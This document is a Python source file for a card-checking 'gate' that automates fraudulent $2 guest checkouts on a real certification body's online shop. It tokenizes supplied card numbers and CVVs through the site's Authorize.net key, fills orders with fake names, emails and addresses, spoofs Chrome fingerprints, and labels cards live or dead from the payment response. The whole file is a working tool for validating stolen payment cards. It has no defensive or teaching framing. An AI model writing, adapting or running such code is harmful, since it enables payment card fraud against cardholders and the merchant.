# Pure gate motor for 'mm' — no Telegram-bot dependency.

import re, random, time

from random import choice, randint

from faker import Faker

from curl_cffi import requests as req

_GATEWAY = 'Authorize.net Charged $2'

_f = Faker('en_US')

_LIVE_RESPONSES = ['There was an issue validating the card security code.', 'Insufficient Funds']

def _fakemail():
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    return f"{''.join((choice(chars) for _ in range(randint(6, 12))))}@{choice(['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com'])}"

def _fakedata():
    return {'first_name': _f.first_name(), 'last_name': _f.last_name(), 'address': _f.street_address(), 'city': _f.city(), 'state': _f.state_abbr(), 'postal': _f.postcode()}

def _gen_address():
    try:
        import random_address
        a = random_address.real_random_address()
        return {'address': a['address1'], 'city': a.get('city', 'Miami'), 'state': a['state'], 'postal': a['postalCode']}
    except Exception:
        return {'address': '123 Main St', 'city': 'Miami', 'state': 'FL', 'postal': '33130'}

def _capture(s, init, offset):
    try:
        return s.split(init)[1].split(offset)[0]
    except Exception:
        return ''

def _flow(num, mes, ano, cvv):
    ano = f'20{ano}' if len(ano) == 2 else ano
    data = _fakedata()
    addr = _gen_address()
    mail = _fakemail()
    phone = f'727{randint(1000, 9999)}{randint(1000, 9999)}'
    sess = req.Session(impersonate=random.choice(['chrome120', 'chrome124', 'chrome123']))
    s1 = sess.post('https://www.nremt.org/ShoppingCart/AddToCart', headers={'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'es-ES,es;q=0.9', 'content-type': 'application/json; charset=UTF-8', 'origin': 'https://www.nremt.org', 'referer': 'https://www.nremt.org/Products/Vouchers/Paper-Application-Processing-Fee-Voucher', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', 'x-requested-with': 'XMLHttpRequest'}, json={'ProductSKUID': 96, 'Quantity': 1}, timeout=30)
    time.sleep(1)
    sess.get('https://www.nremt.org/shopping-cart', timeout=30)
    time.sleep(1)
    sess.get('https://www.nremt.org/shopping-cart/checkout', timeout=30)
    time.sleep(1)
    s4 = sess.post('https://api2.authorize.net/xml/v1/request.api', headers={'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/json; charset=UTF-8', 'Origin': 'https://js.authorize.net', 'Referer': 'https://js.authorize.net/', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'}, json={'securePaymentContainerRequest': {'merchantAuthentication': {'name': '5Ww66SGu5', 'clientKey': '4jErzDpW56xvKpGjH7V53J3xhPCE9uw8GGs37ZmpxA65yqKWVYyq92QVC3m9FpZr'}, 'clientId': 'accept-ui-v3', 'data': {'type': 'TOKEN', 'id': 'e8323048-aece-187c-d42a-6120507f6de2', 'token': {'cardNumber': num, 'expirationDate': f'{mes.zfill(2)}{ano}', 'cardCode': cvv}}}}, timeout=30)
    token = _capture(s4.text, 'dataValue":"', '"')
    if not token:
        return {'status': False, 'raise': 'No Authorize.net token'}
    time.sleep(1)
    sess.get('https://www.nremt.org/validate-address', params={'AuthNetAddressId': 'null', 'FirstName': data['first_name'], 'LastName': data['last_name'], 'PhoneNumber': '', 'StreetAddress': addr['address'], 'City': addr['city'], 'State': addr['state'], 'ZipCode': addr['postal'], 'Country': 'USA', 'IsValidated': 'false'}, timeout=30)
    s6 = sess.post('https://www.nremt.org/Checkout/SaveOrder', headers={'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'es-ES,es;q=0.9', 'content-type': 'application/json; charset=UTF-8', 'origin': 'https://www.nremt.org', 'referer': 'https://www.nremt.org/shopping-cart/checkout', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', 'x-requested-with': 'XMLHttpRequest'}, json={'UserId': 0, 'ShippingAddress': {'AuthNetAddressId': None, 'FirstName': '', 'LastName': '', 'PhoneNumber': '', 'StreetAddress': '', 'City': '', 'State': '', 'ZipCode': '', 'Country': '', 'IsValidated': False}, 'BillingAddress': {'AuthNetAddressId': None, 'FirstName': data['first_name'], 'LastName': data['last_name'], 'PhoneNumber': '', 'StreetAddress': addr['address'], 'City': addr['city'], 'State': addr['state'], 'ZipCode': addr['postal'], 'Country': 'USA', 'IsValidated': True}, 'PaymentInformation': {}, 'AuthOpaqueData': {'dataDescriptor': 'COMMON.ACCEPT.INAPP.PAYMENT', 'dataValue': token}, 'BillingAddressSameAsShipping': False, 'ShippingOptionId': 0, 'PaymentType': '1', 'IsGuestCheckout': True, 'UserHasCIMProfile': False, 'AddNewCIMShippingAddress': False, 'AddNewCIMPaymentMethod': False, 'CustomerProfile': {'FirstName': data['first_name'], 'LastName': data['last_name'], 'Email': mail, 'PhoneNumber': phone}}, timeout=30)
    try:
        r6 = s6.json()
    except Exception:
        return {'status': False, 'raise': f'Parse error: {s6.text[:200]}'}
    code = r6.get('Description', '')
    success = r6.get('Success', False)
    if success or r6.get('data') or any((k in str(r6) for k in ['"OrderGUID"', 'OrderGUID'])):
        return {'status': True, 'success': True, 'response': 'Approved ✅ | Charged $2.00'}
    elif any((kw in code for kw in _LIVE_RESPONSES)):
        return {'status': True, 'success': True, 'response': f'Approved ✅ | {code.strip()}'}
    else:
        return {'status': True, 'success': False, 'response': f"Declined ❌ | {code or 'This transaction has been declined.'}"}

def _checker(cc, binData):
    try:
        return _flow(cc[0], cc[1], cc[2], cc[3])
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}

def run_check(cc, bin_data, ctx=None):
    r = _checker(cc, bin_data)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌', 'response': r.get('response', '')}